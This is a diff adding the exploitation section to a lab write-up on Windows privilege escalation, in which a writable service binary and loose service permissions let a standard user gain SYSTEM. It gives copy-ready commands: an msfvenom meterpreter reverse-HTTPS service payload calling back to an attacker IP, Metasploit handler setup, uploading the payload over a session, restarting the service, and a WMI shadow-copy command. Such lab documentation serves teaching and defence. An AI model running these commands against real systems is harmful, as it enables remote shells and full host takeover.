@@ -364,7 +364,64 @@ File Integrity Verification
 **Root Cause:** The service `VulnSvc` was configured to run under the `LocalSystem` account — the highest privilege context on a Windows host. The followign two misconfigurations made it exploitable by a standard user. First, the service binary directory `C:\VulnService\` had its ACL set to grant `Everyone` full control `(OI)(CI)F`. This allows any authenticated user to overwrite the service binary. Second, the service DACL was modified to grant `Everyone` start and stop permissions. This allows a standard user to restart the service and trigger execution of the replaced binary. Together these misconfigurations allowed a standard user to replace the binary that `LocalSystem` executes, then trigger that execution which is a writable service binary privilege escalation path.
 
 **Exploit Mechanism:**
+ 
+The payload was generated in `exe-service` format so it would respond as a typical service.
+ 
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.92.136 LPORT=15000 -f exe-service -o /home/kali/RATs/service.exe
+```
+ 
+Configure a listener on port 15000 to receive the SYSTEM callback:
+ 
+```bash
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set LHOST 192.168.92.136
+set LPORT 15000
+exploit -j
+```
+ 
+Upload the malicious binary via Session 1 (Apollo) to overwrite the legitimate service binary:
+ 
+```bash
+sessions -i 1
+upload /home/kali/RATs/service.exe C:\\VulnService\\service.exe
+```
+ 
+Restart the service from Apollo's shell to trigger execution as LocalSystem:
+ 
+```bash
+shell
+sc.exe stop VulnSvc
+sc.exe start VulnSvc
+```
 
+**Verification of SYSTEM Session:**
+ 
+Upon service restart, a new Meterpreter session (Session 2) opened on port 15000. `getuid` confirmed the execution context was elevated:
+
+```
+Server username: NT AUTHORITY\SYSTEM
+```
+ 
+*[SCREENSHOT: `sessions -l` output showing Session 1 as Apollo and Session 2 as NT AUTHORITY\SYSTEM]*
+ 
+*[SCREENSHOT: `getuid` output confirming NT AUTHORITY\SYSTEM on Session 2]*
+ 
+---
+ 
+## Verification — Volume Shadow Copy
+ 
+To demonstrate full SYSTEM-level capability, a Volume Shadow Copy of the C: drive was created from the SYSTEM shell. The native `vssadmin create shadow` command was not supported on this build of vssadmin, so the equivalent WMI method was used:
+ 
+```cmd
+powershell -command "(Get-WmiObject -List Win32_ShadowCopy).Create('C:\','ClientAccessible')"
+vssadmin list shadows
+```
+ 
+*[SCREENSHOT: WMI output showing `ReturnValue: 0` and `ShadowID`, followed by `vssadmin list shadows` confirming the shadow copy exists on DESKTOP-H53BPAA]*
+ 
+The `ReturnValue: 0` confirms successful creation. The `vssadmin list shadows` output shows the shadow copy set ID, creation timestamp, originating machine (`DESKTOP-H53BPAA`), and type (`ClientAccessible`), confirming unrestricted SYSTEM-level access on the target host.
 
 <img width="1540" height="395" alt="image" src="https://github.com/user-attachments/assets/cafd0c4b-f56b-4102-ac48-8a1a4b06dca6" />
 <img width="1040" height="30" alt="image" src="https://github.com/user-attachments/assets/0ea0cd4b-542f-4e74-a113-651e860b17cd" />
